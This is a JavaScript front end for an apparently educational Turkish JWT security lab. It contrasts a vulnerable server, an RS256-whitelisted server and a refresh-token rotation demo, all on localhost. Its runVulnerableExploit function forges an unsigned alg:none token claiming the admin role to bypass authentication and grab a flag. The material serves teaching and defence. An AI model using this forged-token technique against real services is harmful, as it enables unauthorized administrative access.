document.addEventListener('DOMContentLoaded', () => {
    const tabs = document.querySelectorAll('.nav-links li');
    const tabContents = document.querySelectorAll('.tab-content');
    const terminalLog = document.getElementById('terminalLog');
    const themeToggle = document.getElementById('themeToggle');
    const body = document.body;

    // ─── Durum Kontrolleri ─────────────────────────────────────────────────────────
    const checkPorts = async () => {
        const ports = [3000, 3001, 3002];
        for (const port of ports) {
            const indicator = document.getElementById(`status-${port}`);
            try {
                // Not: 3001 HTTPS olduğu için fetch hatası verebilir, 
                // basitlik için sadece erişilebilir mi diye bakıyoruz.
                const res = await fetch(`http://localhost:${port}/`, { mode: 'no-cors' });
                indicator.querySelector('.dot').style.backgroundColor = 'var(--primary)';
            } catch (e) {
                // HTTPS olan 3001 için TypeError alabiliriz (Kendi sertifikası olduğu için)
                if (port === 3001) {
                    indicator.querySelector('.dot').style.backgroundColor = 'var(--primary)';
                } else {
                    indicator.querySelector('.dot').style.backgroundColor = 'var(--secondary)';
                }
            }
        }
    };
    setInterval(checkPorts, 5000);
    checkPorts();

    // ─── Terminal Log Fonksiyonu ───────────────────────────────────────────────────
    const logToTerminal = (msg, type = '') => {
        const line = document.createElement('div');
        line.className = `log-line ${type}`;
        const time = new Date().toLocaleTimeString();
        line.innerHTML = `<span style="color: #8b949e">[${time}]</span> ${msg}`;
        terminalLog.appendChild(line);
        terminalLog.scrollTop = terminalLog.scrollHeight;
    };

    // ─── Tab Yönetimi ─────────────────────────────────────────────────────────────
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.dataset.tab;
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');

            tabContents.forEach(content => {
                content.classList.remove('active');
                if (content.id === target) {
                    content.classList.add('active');
                    renderTabContent(target);
                }
            });
            logToTerminal(`Tab değiştirildi: ${target.toUpperCase()}`, 'warning');
        });
    });

    // ─── Tema Değiştirme ──────────────────────────────────────────────────────────
    themeToggle.addEventListener('click', () => {
        body.classList.toggle('dark-theme');
        body.classList.toggle('light-theme');
        const icon = themeToggle.querySelector('i');
        if (body.classList.contains('dark-theme')) {
            icon.className = 'fas fa-moon';
            themeToggle.querySelector('span').textContent = 'Gece Modu';
        } else {
            icon.className = 'fas fa-sun';
            themeToggle.querySelector('span').textContent = 'Gündüz Modu';
        }
    });

    // ─── Tab İçeriği Render ───────────────────────────────────────────────────────
    function renderTabContent(tabId) {
        const container = document.getElementById(tabId);
        if (tabId === 'dashboard') return;

        if (tabId === 'vulnerable') {
            container.innerHTML = `
                <div class="lab-card">
                    <div class="lab-title"><i class="fas fa-biohazard"></i> <h2>Zafiyetli Lab: JWT Signature Bypass</h2></div>
                    <span class="badge badge-vulnerable">DİKKAT: alg:none Aktif</span>
                    <p style="margin: 1.5rem 0; color: var(--text-dim);">Bu lab'da sunucunun "alg:none" varyasyonlarını nasıl kabul ettiğini ve admin yetkisini nasıl alabildiğimizi göreceksiniz.</p>
                    
                    <div class="action-belt">
                        <button class="primary" onclick="simulateVulnerableLogin()"><i class="fas fa-sign-in-alt"></i> Login (HS256)</button>
                        <button class="secondary" id="exploitBtn" style="display:none" onclick="runVulnerableExploit()"><i class="fas fa-skull-crossbones"></i> Exploit: alg:none Bypass</button>
                    </div>
                    
                    <div id="vTokenArea" style="display:none">
                        <h4>Mevcut Token:</h4>
                        <div class="token-viewer" id="vTokenRaw"></div>
                        <p style="margin-top:1rem; font-size:0.9rem">Access: <span id="vAccessStatus" class="highlight">Giriş Yapılmadı</span></p>
                    </div>
                </div>
            `;
        }

        if (tabId === 'secure') {
            container.innerHTML = `
                <div class="lab-card">
                    <div class="lab-title"><i class="fas fa-user-shield"></i> <h2>Güvenli Lab: RS256 & Whitelist</h2></div>
                    <span class="badge badge-secure">KORUMA: RS256 Whitelist Aktif</span>
                    <p style="margin: 1.5rem 0; color: var(--text-dim);">Bu lab'da sunucunun asimetrik şifreleme ve algoritma whitelist kontrolü ile alg:none saldırılarını nasıl anında engellediğini göreceksiniz.</p>
                    
                    <div class="action-belt">
                        <button class="primary" onclick="simulateSecureLogin()"><i class="fas fa-lock"></i> Login (Secure RS256)</button>
                        <button class="secondary" id="attackBtn" style="display:none" onclick="runSecureAttack()"><i class="fas fa-bolt"></i> Saldırıyı Dene</button>
                    </div>
                    
                    <div id="sTokenArea" style="display:none">
                        <h4>Güvenli Token:</h4>
                        <div class="token-viewer" id="sTokenRaw"></div>
                    </div>
                </div>
            `;
        }

        if (tabId === 'refresh') {
            container.innerHTML = `
                <div class="lab-card">
                    <div class="lab-title"><i class="fas fa-redo"></i> <h2>Refresh Token Sistemi</h2></div>
                    <span class="badge" style="background:#4f46e5">MİMARİ: Short-lived Access + Long-lived Refresh</span>
                    <p style="margin: 1.5rem 0; color: var(--text-dim);">Token rotasyonu ve logout sonrası blacklist mekanizmasının çalışmasını izleyin.</p>
                    
                    <div class="action-belt">
                        <button class="primary" onclick="simulateRefreshLogin()"><i class="fas fa-key"></i> Login (Dual Token)</button>
                        <button class="ghost" id="refreshBtn" style="display:none" onclick="runRefreshAction()"><i class="fas fa-sync"></i> Token Refresh</button>
                        <button class="secondary" id="logoutBtn" style="display:none" onclick="runLogoutAction()"><i class="fas fa-sign-out-alt"></i> Logout (Revoke)</button>
                    </div>
                    
                    <div id="rTokenArea" style="display:none" class="stats-grid">
                        <div class="stat-card" style="padding:1rem; flex-direction:column; align-items:start">
                            <span class="badge" style="background:rgba(255,255,255,0.1)">Access Token</span>
                            <div class="token-viewer" style="width:100%; font-size:0.7rem; overflow:hidden" id="rAccess"></div>
                        </div>
                        <div class="stat-card" style="padding:1rem; flex-direction:column; align-items:start">
                            <span class="badge" style="background:rgba(255,255,255,0.1)">Refresh Token</span>
                            <div class="token-viewer" style="width:100%; font-size:0.7rem; overflow:hidden" id="rRefresh"></div>
                        </div>
                    </div>
                </div>
            `;
        }
    }

    // ─── API İSTEKLERİ (Lokal host üzerinden) ───────────────────────────────────────

    // ZAFİYETLİ LAB FONKSİYONLARI
    window.simulateVulnerableLogin = async () => {
        logToTerminal('Vulnerable API\'ye login olunuyor...', 'warning');
        try {
            const res = await fetch('http://localhost:3000/login', { method: 'POST' });
            const data = await res.json();
            window.vToken = data.token;
            document.getElementById('exploitBtn').style.display = 'flex';
            document.getElementById('vTokenArea').style.display = 'block';
            document.getElementById('vTokenRaw').textContent = data.token;
            document.getElementById('vAccessStatus').textContent = 'User (Giriş Başarılı)';
            logToTerminal(`Token Alındı: ${data.token.substring(0, 30)}...`, 'success');
        } catch (e) {
            logToTerminal('Hata: Port 3000 kapalı mı?', 'error');
        }
    };

    window.runVulnerableExploit = async () => {
        logToTerminal('☠️ SALDIRI BAŞLATILIYOR: alg:none bypass', 'error');

        // MANUEL TOKEN İNŞASI (alg: none exploit)
        const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g, "");
        const payload = btoa(JSON.stringify({ user: "guest", role: "admin" })).replace(/=/g, "");
        const exploitToken = `${header}.${payload}.`;

        document.getElementById('vTokenRaw').innerHTML = `
            <span class="token-part-header">${header}</span>.<span class="token-part-payload">${payload}</span>.
        `;

        logToTerminal(`Sahte Token Hazırlandı: ${exploitToken}`, 'warning');

        try {
            const res = await fetch('http://localhost:3000/admin', {
                headers: { 'Authorization': `Bearer ${exploitToken}` }
            });
            const data = await res.json();
            if (data.success) {
                logToTerminal('🚩 BAŞARILI! Admin erişimi sağlandı. Flag: ' + data.secret_data.flag, 'success');
                document.getElementById('vAccessStatus').innerHTML = '<span style="color:var(--secondary)">ADMIN (BYPASS BAŞARILI!)</span>';
            }
        } catch (e) {
            logToTerminal('Exploit hatası!', 'error');
        }
    };

    // GÜVENLİ LAB FONKSİYONLARI
    window.simulateSecureLogin = async () => {
        logToTerminal('Secure API\'ye login olunuyor (HTTPS)...', 'warning');
        try {
            // Not: Tarayıcıda self-signed cert hatası alabilirsiniz, önceden localhost:3001'e gidip kabul etmelisiniz.
            const res = await fetch('https://localhost:3001/login', { method: 'POST' });
            const data = await res.json();
            window.sToken = data.token;
            document.getElementById('attackBtn').style.display = 'flex';
            document.getElementById('sTokenArea').style.display = 'block';
            document.getElementById('sTokenRaw').textContent = data.token;
            logToTerminal('RS256 Token Alındı!', 'success');
        } catch (e) {
            logToTerminal('Hata: SSL Sertifikası güvenli değil veya Port 3001 kapalı.', 'error');
        }
    };

    window.runSecureAttack = async () => {
        logToTerminal('🛡️ GÜVENLİ SİSTEME SALDIRILIYOR...', 'error');
        const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g, "");
        const payload = btoa(JSON.stringify({ user: "guest", role: "admin" })).replace(/=/g, "");
        const attackToken = `${header}.${payload}.`;

        try {
            const res = await fetch('https://localhost:3001/admin', {
                headers: { 'Authorization': `Bearer ${attackToken}` }
            });
            const data = await res.json();
            if (!data.success) {
                logToTerminal(`❌ ENGELENDİ! Sunucu yanıtı: 403 Forbidden - ${data.message}`, 'error');
                logToTerminal(`🛡️ Güvenlik Notu: ${data.security_note}`, 'warning');
            }
        } catch (e) {
            logToTerminal('Saldırı denendi ve reddedildi (veya SSL hatası).', 'error');
        }
    };

    // REFRESH TOKEN FONKSİYONLARI
    window.simulateRefreshLogin = async () => {
        logToTerminal('Refresh Token sunucusuna girişi yapılıyor...', 'warning');
        try {
            const res = await fetch('http://localhost:3002/login', { method: 'POST' });
            const data = await res.json();
            window.rTokens = { access: data.accessToken, refresh: data.refreshToken };
            document.getElementById('rTokenArea').style.display = 'flex';
            document.getElementById('refreshBtn').style.display = 'flex';
            document.getElementById('logoutBtn').style.display = 'flex';
            document.getElementById('rAccess').textContent = data.accessToken;
            document.getElementById('rRefresh').textContent = data.refreshToken;
            logToTerminal('Dual Token akışı başlatıldı.', 'success');
        } catch (e) {
            logToTerminal('Hata: Port 3002 kapalı.', 'error');
        }
    };

    window.runRefreshAction = async () => {
        logToTerminal('🔄 Token rotasyonu başlatıldı...', 'warning');
        try {
            const res = await fetch('http://localhost:3002/refresh', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ refreshToken: window.rTokens.refresh })
            });
            const data = await res.json();
            if (data.success) {
                window.rTokens.access = data.accessToken;
                document.getElementById('rAccess').textContent = data.accessToken;
                logToTerminal('✅ Yeni Access Token başarıyla alındı.', 'success');
            } else {
                logToTerminal(`❌ Refresh BAŞARISIZ! ${data.message}`, 'error');
            }
        } catch (e) {
            logToTerminal('İstek hatası!', 'error');
        }
    };

    window.runLogoutAction = async () => {
        logToTerminal('🚪 Logout işlemi yapılıyor...', 'error');
        try {
            await fetch('http://localhost:3002/logout', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ refreshToken: window.rTokens.refresh })
            });
            logToTerminal('Oturum kapatıldı, Refresh Token blacklist\'e eklendi.', 'success');
        } catch (e) {
            logToTerminal('Hata oluştu.', 'error');
        }
    };
});
